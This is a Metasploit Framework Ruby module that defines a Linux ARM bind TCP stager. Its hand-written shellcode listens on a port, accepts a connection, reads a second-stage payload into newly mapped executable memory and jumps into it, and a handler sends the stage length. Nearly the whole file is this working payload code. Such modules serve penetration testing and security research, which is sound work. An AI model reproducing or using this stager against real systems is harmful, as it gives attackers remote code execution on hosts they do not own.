##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'


###
#
# BindTcp
# -------
#
# Linux bind TCP stager.
#
###
module Metasploit3

	include Msf::Payload::Stager

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Bind TCP Stager',
			'Description'   => 'Listen for a connection',
			'Author'        => 'nemo@felinemenace.org',
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_ARMLE,
			'Handler'       => Msf::Handler::BindTcp,
			'Stager'        =>
				{
					'Offsets' =>
						{
							'LPORT' => [ 224, 'n'    ],
						},
					'Payload' =>
					[
						0xe59f70e0,      	# ldr     r7, [pc, #224]  ; 813c <last+0x20>
						0xe3a00002,      	# mov     r0, #2
						0xe3a01001,      	# mov     r1, #1
						0xe3a02006,      	# mov     r2, #6
						0xef000000,      	# svc     0x00000000
						0xe1a0c000,      	# mov     ip, r0
						0xe2877001,      	# add     r7, r7, #1
						0xe28f10bc,      	# add     r1, pc, #188    ; 0xbc
						0xe3a02010,      	# mov     r2, #16
						0xef000000,      	# svc     0x00000000
						0xe2877002,      	# add     r7, r7, #2
						0xe1a0000c,      	# mov     r0, ip
						0xef000000,      	# svc     0x00000000
						0xe2877001,      	# add     r7, r7, #1
						0xe1a0000c,      	# mov     r0, ip
						0xe0411001,      	# sub     r1, r1, r1
						0xe1a02001,      	# mov     r2, r1
						0xef000000,      	# svc     0x00000000
						0xe1a0c000,      	# mov     ip, r0
						0xe24dd004,      	# sub     sp, sp, #4
						0xe2877006,      	# add     r7, r7, #6
						0xe1a0100d,      	# mov     r1, sp
						0xe3a02004,      	# mov     r2, #4
						0xe3a03000,      	# mov     r3, #0
						0xef000000,      	# svc     0x00000000
						0xe59d1000,      	# ldr     r1, [sp]
						0xe59f307c,      	# ldr     r3, [pc, #124]  ; 8140 <last+0x24>
						0xe0011003,      	# and     r1, r1, r3
						0xe3a02001,      	# mov     r2, #1
						0xe1a02602,      	# lsl     r2, r2, #12
						0xe0811002,      	# add     r1, r1, r2
						0xe3a070c0,      	# mov     r7, #192        ; 0xc0
						0xe3e00000,      	# mvn     r0, #0
						0xe3a02007,      	# mov     r2, #7
						0xe59f3060,      	# ldr     r3, [pc, #96]   ; 8144 <last+0x28>
						0xe1a04000,      	# mov     r4, r0
						0xe3a05000,      	# mov     r5, #0
						0xef000000,      	# svc     0x00000000
						0xe59f7054,      	# ldr     r7, [pc, #84]   ; 8148 <last+0x2c>
						0xe1a01000,      	# mov     r1, r0
						0xe1a0000c,      	# mov     r0, ip
						0xe3a03000,      	# mov     r3, #0
						0xe59d2000,		# ldr     r2, [sp]
						0xe2422ffa,		# sub     r2, r2, #1000   ; 0x3e8
						0xe58d2000,		# str     r2, [sp]
						0xe3520000,		# cmp     r2, #0
						0xda000002,		# ble     811c <last>
						0xe3a02ffa,		# mov     r2, #1000       ; 0x3e8
						0xef000000,		# svc     0x00000000
						0xeafffff7,		# b       80fc <loop>
						0xe2822ffa,		# add     r2, r2, #1000   ; 0x3e8
						0xef000000,		# svc     0x00000000
						0xe1a0f001,		# mov     pc, r1
						0xe3a07001,		# mov     r7, #1
						0xe3a00001,		# mov     r0, #1
						0xef000000,		# svc     0x00000000
						0x5c110002,		# .word   0x5c110002
						0x00000000,		# .word   0x00000000
						0x00000119,		# .word   0x00000119
						0xfffff000,		# .word   0xfffff000
						0x00001022,		# .word   0x00001022
						0x00000123  		# .word   0x00000123
					].pack("V*")

				}
			))
	end

	def handle_intermediate_stage(conn, payload)

		print_status("Transmitting stage length value...(#{payload.length} bytes)")

		address_format = 'V'

		# Transmit our intermediate stager
		conn.put( [ payload.length ].pack(address_format) )

		Rex::ThreadSafe.sleep(0.5)

		return true
	end

end
